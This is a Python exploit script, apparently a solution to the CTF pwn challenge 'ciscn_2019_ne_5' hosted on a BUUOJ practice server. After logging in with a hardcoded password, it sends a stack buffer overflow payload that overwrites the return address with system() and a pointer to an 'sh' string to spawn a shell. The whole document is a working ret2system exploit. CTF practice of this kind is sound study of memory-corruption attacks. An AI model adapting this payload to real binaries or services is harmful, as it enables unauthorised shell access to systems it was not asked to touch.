import sgtlibc
from sgtlibc.gamebox import *
import sgtlibc.ROPgadgets
import os

set_config(GameBoxConfig(
    is_local=False,
    file='./ciscn_2019_ne_5',
    remote='node4.buuoj.cn:25607',
))
s = sgtlibc.Searcher()
# load target and show its checksec
elf = sgtlibc.ROPgadgets.ELF(client.tube_file)
pops = elf.get_rop()

sla(b'password:', b'administrator')

str_menu = b'0.Exit\n:'
sla(str_menu, b'1')
system_addr = 0x080484D0  # print方法里面调用了
str_sh_addr = 0x80482ea  # fflush的第4字节
payload = b'a' * (4+60+8) + p32(0xdeadbeef)
payload += p32(system_addr) + p32(0xdeadbeef) + p32(str_sh_addr)
sla(b'info:', payload)
sla('Exit\n:', '4')
interactive()
